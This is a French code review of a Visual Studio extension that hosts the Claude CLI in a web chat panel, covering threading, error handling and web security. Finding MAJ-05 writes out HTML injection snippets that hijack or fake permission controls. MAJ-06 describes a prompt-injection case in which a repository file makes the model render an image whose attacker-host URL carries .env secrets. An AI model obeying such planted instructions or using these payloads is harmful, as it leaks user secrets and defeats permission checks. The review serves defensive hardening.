# Revue de code ClaudeVS

Date : 12 octobre 2026
Périmètre : `src/ClaudeVS` (15 fichiers C#, 3 fichiers web, configuration), hors bibliothèques tierces du dossier `Chat/web/lib`.
Nature : revue en lecture seule. Aucun code n'a été modifié.

## 1. Synthèse

ClaudeVS est une extension bien construite pour un projet de cette taille (environ 5 300 lignes). Les deux points les plus difficiles du domaine, le threading Visual Studio et le pilotage d'un processus externe par un protocole JSON, sont traités avec sérieux. Le protocole entre le C# et l'interface web est cohérent dans les deux sens, vérifié type par type.

Les faiblesses se concentrent sur trois sujets :

1. **Les erreurs disparaissent avant d'atteindre l'utilisateur.** Beaucoup de chemins (écriture vers le CLI, lambdas de fond, lecture de fichier avant une permission, messages web mal formés) finissent dans un journal ou dans la télémétrie de Visual Studio, pendant que le chat reste figé sur « Claude travaille… ».
2. **L'interface web approuve des actions, mais son contenu rendu n'est pas assez cloisonné.** La configuration par défaut de DOMPurify laisse passer `id`, `style` et les éléments de formulaire, et la politique de sécurité autorise les images distantes.
3. **Dette de structure.** Cinq résolveurs de chemin différents côté outils, un contrôleur de chat à six responsabilités, un fichier JavaScript unique, et aucun test automatisé.

| Axe | Note | Commentaire |
|---|---|---|
| Maintenabilité | 6 / 10 | Lisible et commenté, mais duplication et classes à responsabilités multiples, testabilité nulle. |
| Qualité du code | 7 / 10 | Threading et échappement exemplaires ; plusieurs NRE sur objets COM optionnels, écriture bloquante sur le thread UI, configuration de sécurité web trop permissive. |
| Gestion des erreurs | 5 / 10 | Bons messages d'erreur vers le modèle ; mais nombreux chemins silencieux côté chat, états incohérents après interruption ou mort du processus. |

Aucun constat n'est classé bloquant au sens strict (bug certain à chaque exécution). Dix constats sont classés majeurs.

## 2. Méthode

Trois relectures indépendantes, chacune sur un périmètre disjoint, sans partage d'hypothèses :

- Outils IDE (C#) : package, serveur, outils Roslyn, débogueur, éditeur, tests, diff.
- Chat et processus (C#) : contrôleur, fenêtre WebView2, processus Claude, index de fichiers.
- Front web (JS, HTML, CSS).

Puis une passe transversale sur la frontière C# ↔ JS (chaque type de message envoyé est-il traité en face, et que se passe-t-il en cas d'erreur à chaque étape), et une vérification manuelle des constats de gravité majeure dans le code. Les constats marqués « à confirmer » sont ceux dont le scénario dépend d'un comportement externe (Fleck, `dotnet test`, version du CLI) non reproduit ici.

## 3. Points forts

- **Threading Visual Studio maîtrisé.** Tout ce qui vient d'un thread de fond repasse par `JoinableTaskFactory` et `SwitchToMainThreadAsync`. Les attentes de build et de débogueur sont faites par sondage asynchrone plutôt que par appels bloquants. Aucun `async void`, `.Result` ou `.Wait()` sur le thread UI.
- **Gardes contre les processus périmés.** Le test `source != _claude` dans `ChatController` et le numéro `seq` de l'autocomplétion empêchent un ancien processus ou une ancienne recherche de polluer l'état courant.
- **Échappement de ligne de commande rigoureux** dans `ClaudeProcess.Quote`, conforme aux règles de `CommandLineToArgvW`.
- **Surface WebView2 verrouillée.** Hôte virtuel en `Deny`, navigation hors hôte annulée, liens externes filtrés, CSP avec `default-src 'none'` et `script-src 'self'`.
- **Discipline `textContent` côté JS.** Toute la construction DOM passe par un helper `el()`. Aucun chemin où du contenu de Claude atteint `innerHTML` sans DOMPurify, hors SVG mermaid.
- **Erreurs d'outils renvoyées au modèle** sous forme `isError` avec des messages actionnables, plutôt qu'en erreur JSON-RPC.
- **Diff natif avec retouches.** Les modifications faites par l'utilisateur dans l'onglet de diff sont renvoyées au CLI via `updatedInput`, une vraie valeur ajoutée.
- **Streaming maîtrisé** : coalescence des deltas par `requestAnimationFrame`, auto-scroll conditionnel, dédoublonnage des messages.
- **Authentification du serveur local** : jeton aléatoire, liaison sur 127.0.0.1, verrou nettoyé par PID.

## 4. Constats majeurs

Chaque constat indique le fichier et la ligne, le problème, un scénario concret et une correction. « Vérifié » signifie que le code a été relu et que le scénario découle directement de sa structure.

### MAJ-01 · Écriture synchrone et non bornée sur stdin depuis le thread UI

`Chat/ClaudeProcess.cs:105-110`, appelé depuis `Chat/ChatController.cs:177`. Vérifié.

`Send` écrit sous verrou, avec `AutoFlush`, sur le thread UI. Une image collée peut représenter plusieurs mégaoctets de base64 (`app.js:660`), sans limite de nombre. Le tampon d'un pipe anonyme fait quelques kilo-octets : l'écriture ne se termine que si le CLI lit stdin. Si le CLI est bloqué, devenv se fige sans possibilité d'annuler.

Correction : file d'envoi avec un thread écrivain (ou `WriteAsync` sur un flux asynchrone), timeout, et remontée d'erreur au chat.

### MAJ-02 · Erreurs d'écriture vers le CLI avalées, chat figé

`Chat/ClaudeProcess.cs:105-110`, `Chat/ChatController.cs:92-177, 512`, `Chat/ChatToolWindow.cs:101-102`. Vérifié.

Si le pipe est fermé (processus mort entre le test `IsRunning` et l'écriture), `Send` lève une `IOException`. Tous les appelants la laissent remonter jusqu'au `catch` de `ChatToolWindow`, qui ne fait que journaliser. Côté JS, la bulle utilisateur est déjà affichée et la zone de saisie vidée (`app.js:630-634`) : le message est perdu sans explication. Pour `ResolvePermission`, la carte reste ouverte car `permissionResolved` n'est pas posté.

Correction : `TrySend` avec un type d'exception dédié, `PostError` dans `HandleUiMessage`, et ne poster `busy` qu'après succès.

### MAJ-03 · Lambdas de fond sans try/catch : les erreurs partent dans la télémétrie, pas dans le chat

`Chat/ChatController.cs:188-192, 319-381, 486-496, 535-560` ; `Chat/ChatToolWindow.cs:59, 169-174`. Vérifié.

Toutes les lambdas `RunAsync(...).FileAndForget` sont sans protection. Une `InvalidCastException` sur `(JObject)msg["request"]` (ligne 328) ou `(bool)r["changed"]` (ligne 390) interrompt la lambda avant le relais `_post(cli)` de la ligne 380 : l'utilisateur voit un flux qui saute des messages, et rien dans le volet Claude.

Correction : un helper `RunOnUiAsync(Func<Task>, string nom)` qui enveloppe dans un try/catch, journalise avec la pile et poste une erreur au chat.

### MAJ-04 · Lecture de fichier hors try avant l'affichage d'une permission : CLI bloqué

`Chat/ChatController.cs:325-331, 380, 526`. Vérifié.

Pour un `can_use_tool` sur Edit/Write, `ShowEditDiff` est appelé avant le relais `_post(cli)`. `File.ReadAllText(path)` (ligne 526) est hors du try (seul `ApplyEdit` est protégé, ligne 528) et le chemin vient du modèle. Fichier verrouillé ou chemin UNC indisponible : la lambda sort, la carte n'est jamais affichée, le CLI attend une réponse qui ne viendra pas, le statut reste « Claude travaille… ».

Correction : poster `cli` d'abord, envelopper `ShowEditDiff`, répondre `deny` au CLI en cas d'échec, lire le fichier hors thread UI.

### MAJ-05 · DOMPurify en configuration par défaut : clobbering des éléments de l'application

`Chat/web/app.js:5, 11, 104, 435, 592-611`. Vérifié.

`marked` en mode GFM laisse passer le HTML brut. DOMPurify par défaut conserve `id`, `name`, `class`, `style` et les balises de formulaire. Comme `$()` est réévalué à chaque appel et que `#messages` précède le pied de page dans le DOM, un `<span id="stop">` dans une réponse (ou dans un fichier lu que Claude recopie) fait que `$('stop').hidden` agit sur l'élément injecté : le bouton Arrêter ne s'affiche plus. Avec `style`, un `<div style="position:fixed;inset:0">` recouvre le panneau, y compris les cartes de permission ; avec `class="perm"` on fabrique une fausse carte « Autoriser ».

Correction : résoudre les références DOM une seule fois au démarrage ; `FORBID_ATTR: ['id','name','style']`, `FORBID_TAGS: ['form','input','button','select','textarea','label']`, hook ne gardant `class` que sur `code` ; ajouter `form-action 'none'` à la CSP.

### MAJ-06 · `img-src https:` ouvre un canal d'exfiltration passif

`Chat/web/index.html:6`. Vérifié. Faille d'architecture, pas de bug certain.

Une image markdown `![](https://attaquant/x?d=...)` dans une réponse est chargée automatiquement au rendu, et rechargée à chaque re-rendu pendant le streaming, sans clic ni passage par `NavigationStarting`. C'est le vecteur classique d'injection de prompt contre les interfaces de chat : un fichier du dépôt demande à Claude d'« afficher » une image dont l'URL contient le contenu d'un `.env`.

Correction : `img-src 'self' data:` (les captures collées restent en `data:`), éventuellement un hook DOMPurify remplaçant les images distantes par un lien texte.

### MAJ-07 · Retour arrière des fichiers attaché à la mauvaise bulle

`Chat/web/app.js:142-143, 545, 560`. Vérifié.

`renderHistory` crée les bulles des prompts à contenu chaîne (sessions commencées dans le terminal) sans `uuid` (ligne 545), alors que la branche tableau le passe (ligne 560). `onUserReplay` attache ensuite l'uuid rejoué à `bubbles[0]`, la première bulle sans uuid de tout le fil, et non à la dernière envoyée. Après reprise d'une session issue du terminal, chaque nouveau message pose son uuid sur une vieille bulle : le bouton ↶ d'une bulle ancienne restaure les fichiers à un point récent. La carte de prévisualisation liste les fichiers, mais le titre « d'avant ce message » est faux.

Correction : passer `m.uuid` ligne 545 ; dans `onUserReplay`, viser la dernière bulle sans uuid, ou mieux marquer explicitement la bulle en attente dans `send()`.

### MAJ-08 · Course entre le rendu différé et la finalisation : diagrammes mermaid écrasés

`Chat/web/app.js:196-202`. Vérifié.

`render()` planifie un `requestAnimationFrame` que `finalize()` n'annule pas. Si le dernier delta et le `content_block_stop` arrivent dans la même fenêtre de 16 ms (cas typique en fin de flux), `finalize` rend le markdown et remplace les blocs mermaid par des conteneurs, puis le rAF réaffecte `innerHTML` et détruit ces conteneurs. Le SVG est écrit dans un élément détaché : le diagramme s'affiche en code brut.

Correction : mémoriser l'identifiant du rAF et l'annuler dans `finalize`, ou tester un drapeau `done` dans le callback.

### MAJ-09 · Drapeau `interrupted` jamais remis à zéro hors `result`

`Chat/web/app.js:52, 528-531, 566-571, 705, 857`. Vérifié.

Échap pendant que le processus meurt : le C# envoie `status: idle` et `error` mais aucun `result`. `interrupted` reste vrai. Au tour suivant, un `result` en erreur affiche « — interrompu — » et masque la vraie erreur (branche `else if`). `clear()` ne réinitialise pas non plus ce drapeau.

Correction : réinitialiser dans `setStatus('idle' | 'ready')` et dans `clear()` ; afficher erreur et interruption indépendamment.

### MAJ-10 · Jeton d'authentification vérifié uniquement à l'ouverture de la connexion

`IdeServer.cs:140-181, 184-229`. Structure vérifiée, fenêtre d'exploitation à confirmer.

Le jeton n'est contrôlé que dans `OnOpen`. `OnMessage` est branché inconditionnellement et `HandleMessageAsync` ne revérifie rien. Dans Fleck, `OnOpen` est invoqué dans le callback d'envoi du handshake pendant que la boucle de lecture continue : un client qui envoie handshake et `tools/call` dans la même rafale peut être servi avant `socket.Close()`. Le coût de la correction est nul.

Correction : mémoriser l'état « authentifié » par socket et refuser tout message tant qu'il n'est pas vrai.

### MAJ-11 · `debugStart` répond « Not debugging » pendant la compilation

`DebugTools.cs:243-251, 318-338`. Vérifié.

`Go(false)` déclenche d'abord la compilation, pendant laquelle `CurrentMode` reste `dbgDesignMode`. `WaitForBreakOrEndAsync` teste `mode != dbgRunMode` après 300 ms et retourne immédiatement « design ». La note « build failed » n'est posée que si `LastBuildInfo > 0`, qui reflète le build précédent. Le modèle conclut que le programme s'est terminé alors que la session démarre cinq secondes plus tard.

Correction : traiter `SolutionBuild.BuildState == vsBuildStateInProgress` comme « en cours » dans la boucle de sondage.

### MAJ-12 · Résultats de tests écrasés en solution multi-projets

`TestTools.cs:40, 79`. À confirmer avec une solution multi-projets.

`--logger "trx;LogFileName=results.trx"` avec un dossier de résultats unique : chaque projet de tests écrit le même fichier et écrase le précédent. Seul le dernier TRX subsiste, les échecs des autres projets sont invisibles.

Correction : `--logger trx` sans `LogFileName`, ou `LogFilePrefix=`.

### MAJ-13 · Cinq résolutions de chemin relatif divergentes

`IdeTools.cs:174-185`, `DebugTools.cs:156-160, 463-472`, `EditorTools.cs:62-76`, `RoslynTools.cs:107-119`. Vérifié.

Cinq bases différentes (solution, `Dte.Solution.FullName`, premier projet, `Solution.FilePath` Roslyn) et des comportements divergents (vérification d'existence ou non, `Path.GetDirectoryName("")` qui lève `ArgumentException` sans solution ouverte). Le modèle passe `src/Foo.cs` à `openFile` avec succès puis à `breakpointAdd` qui échoue. Toute correction est à reporter cinq fois.

Correction : un `PathResolver.Resolve(string, bool mustExist)` unique avec une seule règle de base.

### MAJ-14 · Dossier de travail du CLI jamais réconcilié avec la solution courante

`Chat/ChatController.cs:247`, `ClaudeVSPackage.cs:99-106`. Vérifié.

Le dossier de travail est fixé à la création du processus. Après changement de solution, l'index de fichiers, les sessions listées et le chemin affiché suivent la nouvelle solution, mais le CLI vit dans l'ancienne. L'utilisateur tape `@src/Foo.cs` complété depuis le nouvel index et Claude édite le fichier de l'ancienne solution.

Correction : s'abonner aux événements de solution, et soit redémarrer le processus avec avertissement, soit afficher un bandeau.

## 5. Constats mineurs

### Gestion des erreurs et états incohérents

| Id | Fichier:ligne | Problème | Correction |
|---|---|---|---|
| MIN-01 | `SelectionTracker.cs:47-57, 75` | `Tick` du `DispatcherTimer` sans try/catch ; `new Uri(path)` peut lever sur un document sans chemin exploitable. Une exception remonte au Dispatcher WPF de VS. | try/catch journalisé ; `Uri.TryCreate`. |
| MIN-02 | `Chat/web/app.js:575-621, 217, 262, 341` | Aucune garde globale autour du dispatch des messages ; `m.event` ou `c.name` absents provoquent un `TypeError` silencieux. Un seul try/catch dans tout le fichier. | try/catch autour du `switch`, erreur discrète dans le fil, `console.error`, repli `textContent` dans `renderMd`. |
| MIN-03 | `Chat/ChatController.cs:280-282, 490-492` ; `app.js:388-448` | Permissions orphelines : `OnCliExited` vide le dictionnaire sans fermer les onglets de diff ni poster `permissionResolved` ; l'interruption d'un tour ne clôt pas la demande ; `control_cancel_request` n'est traité nulle part. Les cartes restent cliquables et leur clic est ignoré en silence. | Factoriser `ClearPendingPermissions()` ; traiter `control_cancel_request` ; côté JS marquer les cartes « expirées » sur `idle` et `result`. |
| MIN-04 | `Chat/ChatController.cs:494` | Fin de processus avec code 0 pendant un tour : aucun message, la bulle reste sans réponse. | Poster une `notice` si `_busy` était vrai. |
| MIN-05 | `Chat/ChatController.cs:433` | `Control()` retourne en silence si le processus ne tourne pas : le bouton ↶ semble mort. | `PostError` ou désactiver les boutons sur `idle`. |
| MIN-06 | `Chat/ClaudeProcess.cs:52, 78-79` | Course stdout/stderr à la fin : `_stderrTail` est lu dès que stdout se ferme, le message d'erreur peut être incomplet. | Conserver la tâche stderr et l'attendre avant `Exited`. |
| MIN-07 | `Chat/web/app.js:521-524` | « Compactage du contexte… » reste affiché en plein tour. | `setStatus(busy ? 'busy' : 'ready')`. |
| MIN-08 | `Chat/web/app.js:512-516` | Erreurs de `control_response` (refus de `set_model`, `set_permission_mode`) ignorées : le sélecteur affiche une valeur non appliquée. | Afficher `r.error`. |
| MIN-09 | `Chat/ChatController.cs:112-119` | `setEffort` à vide ne renvoie rien au CLI, qui garde l'effort précédent. | Envoyer `null` ou documenter. |
| MIN-10 | `IdeTools.cs:290-296` | `doc.Save()` retourne un `vsSaveStatus` ignoré : « saved successfully » même si l'utilisateur a annulé. | Tester le retour. |
| MIN-11 | `DebugTools.cs:185-190, 207` | Après 10 minutes de build, pas de signalement du timeout ; les erreurs listées viennent de l'Error List qui mélange build et IntelliSense, tous projets. | Ajouter `timedOut` ; filtrer par projet. |
| MIN-12 | `RoslynTools.cs:92` | `CancellationToken.None` partout, aucun timeout ; le travail continue si le client se déconnecte. | `CancellationTokenSource` avec timeout, annulation sur `OnClose`. |
| MIN-13 | `RoslynTools.cs:370` | `renameSymbol` n'alerte pas sur les conflits de nom ; la solution peut ne plus compiler. | Comparer les erreurs avant/après. |
| MIN-14 | `TestTools.cs:69-74, 81-88, 129` | Sur timeout, `Kill()` ne tue pas `testhost.exe` ; dossier temporaire non nettoyé hors chemin nominal ; `dotnet` absent lève une `Win32Exception` brute. | `taskkill /T` ; try/finally ; message explicite. |
| MIN-15 | `TestTools.cs:101` | `skipped = total - executed + notExecuted` compte les ignorés deux fois. À vérifier sur un TRX réel. | `total - passed - failed`. |
| MIN-16 | `IdeServer.cs:112, 119` | `Process.GetProcessById` peut lever `Win32Exception` (autre utilisateur), attrapée comme « fichier illisible » : verrou non nettoyé. | Attraper au bon endroit ; vérifier `ProcessName`. |
| MIN-17 | `Chat/web/app.js:644-668` | Ni `reader.onerror` ni `img.onerror` : image corrompue ignorée sans retour. | Ajouter les gestionnaires. |
| MIN-18 | `Chat/ClaudeProcess.cs:97` ; `Chat/ChatToolWindow.cs:92` ; `Chat/ChatController.cs:712` | `catch { }` génériques : lecture stderr, JSON invalide venant de l'UI, lecture de session. | Au minimum journaliser. |

### Cycle de vie et ressources

| Id | Fichier:ligne | Problème | Correction |
|---|---|---|---|
| MIN-19 | `Chat/ChatController.cs:211, 250, 490` | Fuite de `Process` et `StreamWriter` : un processus mort est remplacé ou mis à `null` sans `Dispose`. | `source.Dispose()` dans `OnCliExited` et `EnsureStarted`. |
| MIN-20 | `Chat/ChatToolWindow.cs:60, 203-207` | `VSColorTheme.ThemeChanged` jamais désabonné ; après `Dispose`, `PostTheme` accède au WebView disposé. | Conserver le handler et le retirer dans `Dispose`. |
| MIN-21 | `Chat/ChatToolWindow.cs` | `CoreWebView2.ProcessFailed` non géré : panneau blanc définitif en cas de crash du renderer, et historique perdu au rechargement. | `Reload()` + message ; rejouer depuis `SessionStore`. |
| MIN-22 | `Chat/ChatToolWindow.cs:173` | File `_queue` non bornée si l'initialisation WebView2 échoue : chaque changement de sélection s'accumule pendant toute la session. | Ignorer les posts après échec, ou borner. |
| MIN-23 | `Chat/ClaudeProcess.cs:144` | `WaitForExit(3000)` sur le thread UI à chaque `newChat`/`resume` et à la fermeture de VS. | `Dispose` asynchrone. |
| MIN-24 | `Chat/ClaudeProcess.cs` | Pas de Job Object : si devenv meurt brutalement, le CLI et ses sous-processus survivent. | `CreateJobObject` + `KILL_ON_JOB_CLOSE`. |
| MIN-25 | `Chat/ChatController.cs:269, 732-745` | Chargement d'historique synchrone sur le thread UI, puis un seul message WebView potentiellement de plusieurs dizaines de Mo. | `Task.Run`, tronquer les `tool_result`, envoyer par lots. |
| MIN-26 | `Chat/ChatController.cs:295-311` | Fichier de config MCP contenant le jeton écrit dans `%TEMP%` et jamais supprimé. | Supprimer dans `StopProcess`, ou passer la config inline. |
| MIN-27 | `DiffManager.cs:88, 123-126` ; `ClaudeVSPackage.cs:128-142` | Dossiers temporaires de diff jamais purgés ; journal jamais tronqué, écrit de façon synchrone sous verrou. | Purge au démarrage ; rotation. |
| MIN-28 | `DebugTools.cs:105-112, 329` | `Dte` résolu par `GetGlobalService` + cast COM à chaque accès, y compris dans les boucles de sondage à 250 ms. | Mettre en cache. |
| MIN-29 | `DebugTools.cs:246` | `StartupProjects` modifié durablement sans restauration. | Sauvegarder/restaurer ou documenter. |
| MIN-30 | `EditorTools.cs:184-210` | `ListBookmarks` pilote l'IDE (jusqu'à 500 commandes) sans try/finally : la restauration du document actif et du caret est sautée en cas d'exception. | try/finally. |

### Robustesse et NRE

| Id | Fichier:ligne | Problème | Correction |
|---|---|---|---|
| MIN-31 | `IdeTools.cs:243-244` | `GetWpfViewAsync` peut retourner `null` (éditeur non WPF) : NRE sur `view.TextSnapshot`. | Tester null. |
| MIN-32 | `EditorTools.cs:139-142` | `view` peut être null après `OpenDocument` : NRE sur `SetCaretPos`. Variable `before` inutilisée. | Tester null ; supprimer `before`. |
| MIN-33 | `DiffManager.cs:70-79` | `OpenComparisonWindow2` peut retourner `null` : NRE sur `frame.Show()`. | Exception explicite. |
| MIN-34 | `ClaudeLauncher.cs:58-60` | `Server.Port` sans garde ; `Process.Start` peut lever `Win32Exception` (`node` hors PATH) dans un handler de menu. | try/catch → `ShowMessageBox`. |
| MIN-35 | `Chat/ChatController.cs:550-553` | Retouches utilisateur dans le diff perdues pour `Edit` sur fichier vide ; deux `if` successifs construisent puis écrasent `updated` pour MultiEdit. | `switch (tool)` explicite ; convertir en `Write` si vide. |
| MIN-36 | `Chat/ChatController.cs:374` | `AutoFormat` déclenché sur tout `tool_use_result.filePath` sans vérifier l'outil d'origine. À confirmer selon les outils qui exposent ce champ. | Corréler avec le `tool_use` Edit/Write. |
| MIN-37 | `Chat/FileIndex.cs:30-33` | Changement de dossier pendant la construction de l'index : résultats de l'ancien dossier. | Mémoriser le dossier en cours et relancer. |
| MIN-38 | `TestTools.cs:140` | `Quote` n'échappe pas les `\` précédant un `"` : un chemin terminé par `\` corrompt l'argument. | Réutiliser `ClaudeProcess.Quote`. |
| MIN-39 | `Chat/web/app.js:149` | Sélecteur CSS construit par interpolation de l'uuid : `SyntaxError` si l'uuid contient `"`. | `CSS.escape`. |
| MIN-40 | `Chat/web/app.js:789, 817-822` | Timer de recherche `@` non annulé par `hidePopup` : la popup peut s'ouvrir sur un champ vidé avec un `start` périmé. | `clearTimeout` dans `hidePopup`. |
| MIN-41 | `Chat/web/app.js:33` | SVG mermaid injecté sans DOMPurify. `securityLevel: 'strict'` et la CSP limitent le risque, mais mermaid a un historique de CVE sur ses libellés. | `DOMPurify.sanitize(svg, { USE_PROFILES: { svg: true } })`. |

### Exactitude des outils exposés au modèle

| Id | Fichier:ligne | Problème | Correction |
|---|---|---|---|
| MIN-42 | `IdeTools.cs:85, 89, 238-241` | `preview` et `makeFrontmost` déclarés dans le schéma mais ignorés : le focus est volé. | `ShowNoActivate` ; retirer `preview`. |
| MIN-43 | `RoslynTools.cs:206` | `count` brut avant filtrage, liste tronquée à 100 sans indicateur. | `count` filtré + `truncated`. |
| MIN-44 | `RoslynTools.cs:328-336` | Description « Compiler and analyzer diagnostics » mais les analyseurs ne sont pas inclus. | Corriger la description. |
| MIN-45 | `ClaudeVSPackage.cs:88` | `panelOpen` reste vrai après fermeture du panneau par l'utilisateur (tool window en cache). À vérifier à l'exécution. | Tester `frame.IsVisible()`. |
| MIN-46 | `DebugMonitor.cs:47` ; `ClaudeVSPackage.cs:65-71` | Le chat est réaffiché à chaque pas de débogage même si l'utilisateur l'a fermé. | Mémoriser une fermeture volontaire. |

### Lisibilité et code mort

| Id | Fichier:ligne | Problème | Correction |
|---|---|---|---|
| MIN-47 | `RoslynTools.cs:163` | `symbol != null && Kind != Namespace \|\| symbol is INamespaceSymbol` équivaut à `symbol != null`. Intention illisible. | Simplifier ou parenthéser. |
| MIN-48 | `RoslynTools.cs:144-146` | `Match().Index` vaut 0 en échec : `col < 0` toujours faux, regex évaluée deux fois. | `var m = Regex.Match(...); if (!m.Success) throw`. |
| MIN-49 | `Chat/ChatController.cs:122-124` | `case "contextUsage"` jamais émis par `app.js`. | Supprimer. |
| MIN-50 | `DebugTools.cs:36` ; `DebugMonitor.cs:23` | `_waiting` statique parce que `DebugMonitor` instancie son propre `DebugTools` au lieu de partager celui d'`IdeTools`. | Injecter l'instance. |
| MIN-51 | `DebugTools.cs:305-315` | `RecentDebugOutput` sérialise en JSON puis re-parse pour une valeur interne. | Scinder `ReadPane` + wrapper MCP. |
| MIN-52 | `ClaudeVSPackage.cs:99-106` | `RefreshWorkspace` crée un nouvel `IdeTools` à chaque ouverture de solution alors que `Tools` existe. | Réutiliser. |
| MIN-53 | `Chat/web/app.js:392, 246, 348-352, 705/857, 262/341, 528/559` | `append` masqué par une constante locale ; `currentMessageId` déclaré après usage ; propriétés expando sur les éléments ; duplications (interruption, `mcp__`, « interrompu »). | Nettoyer. |
| MIN-54 | `Chat/web/style.css:77/197, 231/234` | `.msg.user` et `.context-row` définis deux fois. | Fusionner. |
| MIN-55 | `Chat/web/style.css:12-17` | Couleurs sémantiques fixes non adaptées au thème clair : contraste ~2:1 sur fond blanc. | Seconde palette quand `dark` est faux. |
| MIN-56 | `Chat/web/app.js, index.html` | Accessibilité : `div` cliquables sans `tabindex`/`role`, boutons icônes sans `aria-label`, popup sans `role="listbox"`, `#messages` sans `aria-live`. | Ajouter les attributs. |
| MIN-57 | `Chat/web/app.js:458-476, 413-416` | `questionCard` : réponses indexées par texte (collision), champ « Autre » non synchronisé, « Répondre » permis à vide ; Entrée inactif dans le champ du plan. | Indexer par position ; cohérence clavier. |
| MIN-58 | `ClaudeVS.csproj:21` ; `DebugTools.cs:13` | `<Title>Claude fo VS</Title>` ; `using Thread = EnvDTE.Thread` inutilisé. | Corriger. |

## 6. Suggestions

| Id | Sujet | Proposition |
|---|---|---|
| SUG-01 | Découpage de `ChatController` (665 lignes hors `SessionStore`) | Six responsabilités mélangées. Extraire `ClaudeArguments` (options → ligne de commande + config MCP), `EditPreview` (`ApplyEdit`/`Replace`, purs et testables), `PermissionBroker`, `SessionStore.cs`, et une interface `IIdeContext` pour les singletons (`DiffManager.GetInstance`, `SelectionTracker`, `DebugMonitor`, `Package.GetGlobalService`). |
| SUG-02 | Découpage de `app.js` en modules ES | La page est servie en `https://` et la CSP autorise `script-src 'self'` : `<script type="module">` fonctionne. Découpage par sections existantes : `host.js` (pont et dispatch par table), `markdown.js`, `stream.js`, `tools.js`, `permissions.js`, `composer.js`, `state.js`. Rend testables `toolSummary`, `rel`, `short`. |
| SUG-03 | Déclaration des outils MCP | Trois `HashSet` `Names` parallèles aux `Definitions()` et aux `switch` : une interface `IToolGroup { Definitions; Handles(name); CallAsync; ModelVisible }` supprime la triple déclaration et la liste `ModelTools` codée en dur. `runTests` est à cheval sur `TestTools` et `DebugTools`. |
| SUG-04 | Constantes de protocole | 19 types UI→C# et 18 types C#→JS en chaînes littérales des deux côtés. Un `Protocol.cs` et un `protocol.js` centralisés. |
| SUG-05 | Tests automatisés | Aucun projet de tests. Les parties pures (`ApplyEdit`/`Replace`, `Quote`, `SessionStore`, `ExceptionPrompt`, `TestTools.ParseTrx`, `toolSummary`, `rel`) sont testables sans Visual Studio dès qu'elles sont extraites. |
| SUG-06 | `ClaudeVSPackage.Instance` | Localisateur de service global utilisé sans `?.` dans `DebugTools.cs:161` alors que `_package` est disponible. Injecter `Log` et `IdeTools` par constructeur. |
| SUG-07 | `Nullable enable` | `LangVersion latest` sur net472 le permet ; les annotations auraient attrapé MIN-31 à MIN-34. Vérifier que les analyseurs VSTHRD sont actifs. |
| SUG-08 | Fleck | Version 1.2.0 non maintenue depuis 2019. `System.Net.WebSockets` + `HttpListener` éliminerait aussi MAJ-10. `_ = HandleMessageAsync(...)` sans observation des fautes. |
| SUG-09 | DevTools | `AreDevToolsEnabled = true` inconditionnel et port de débogage par variable d'environnement : conditionner à `#if DEBUG`. |
| SUG-10 | Timeout de démarrage | Si le CLI ne répond jamais à `initialize`, le statut reste « starting » sans indication. Un timer de 30 s qui poste une `notice`. |
| SUG-11 | Coût du streaming | Chaque frame refait `marked.parse` + `DOMPurify` sur le texte complet (quadratique). Acceptable jusqu'à quelques dizaines de Ko ; au-delà, limiter à 100 ms ou ne re-rendre que le dernier bloc. |
| SUG-12 | Validation des valeurs UI | `mode`, `model`, `effort` injectés dans la ligne de commande sans validation : le quoting empêche l'injection, mais une valeur inattendue fait sortir le CLI avec un message peu parlant. |
| SUG-13 | Divers web | `#welcome` jamais restauré après `clear()` ; `rel()` ne traite que `\` ; hauteur du textarea non recalculée hors événement `input` ; `:has()` répété quatre fois dans `style.css` (poser une classe `busy`) ; dépendance à `color-mix()` à documenter. |

## 7. Plan de remédiation priorisé

### Lot 1 · Fiabilité du chat (1 à 2 jours)

Objectif : plus jamais de chat figé sans explication.

1. MAJ-03 : helper `RunOnUiAsync` avec try/catch et `PostError`, appliqué aux six lambdas.
2. MAJ-02 + MAJ-01 : `TrySend` asynchrone avec file d'envoi et timeout ; `busy` posté après succès.
3. MAJ-04 : relais `cli` avant `ShowEditDiff`, lecture de fichier protégée, `deny` en cas d'échec.
4. MIN-03 + MAJ-09 : `ClearPendingPermissions()` unique, traitement de `control_cancel_request`, réinitialisation de `interrupted` et marquage des cartes expirées.
5. MIN-02 : try/catch global autour du dispatch JS.
6. MIN-19, MIN-20, MIN-06, MIN-04 : libération des handles, désabonnement du thème, attente de stderr, notice sur sortie code 0.

### Lot 2 · Sécurité de l'interface (demi-journée)

1. MAJ-05 : références DOM résolues une fois ; DOMPurify avec `FORBID_ATTR` et `FORBID_TAGS` ; `form-action 'none'`.
2. MAJ-06 : `img-src 'self' data:`.
3. MAJ-10 : état « authentifié » par socket dans `IdeServer`.
4. MIN-41 : SVG mermaid passé par DOMPurify.
5. MIN-26 : suppression du fichier de config MCP à l'arrêt.

### Lot 3 · Exactitude des outils (1 jour)

1. MAJ-11 : prise en compte de `BuildState` dans l'attente du débogueur.
2. MAJ-12 : logger TRX sans nom fixe.
3. MAJ-13 : `PathResolver` unique.
4. MAJ-07 + MAJ-08 : uuid de retour arrière, annulation du rAF.
5. MIN-10, MIN-11, MIN-12, MIN-13, MIN-42 à MIN-44.

### Lot 4 · Structure (2 à 3 jours, à étaler)

1. SUG-01 : extraction de `SessionStore`, `EditPreview`, `ClaudeArguments`.
2. SUG-05 : premier projet de tests sur les parties extraites.
3. SUG-02 : modules ES côté web.
4. SUG-03 + SUG-04 : interface `IToolGroup`, constantes de protocole.
5. MAJ-14 : réconciliation du dossier de travail avec la solution.

## 8. Notes par axe et par couche

| Couche | Maintenabilité | Qualité | Erreurs |
|---|---|---|---|
| Outils IDE (C#) | 6 | 7 | 6 |
| Chat et processus (C#) | 6 | 7 | 5 |
| Front web | 6 | 6 | 5 |
| **Ensemble** | **6** | **7** | **5** |
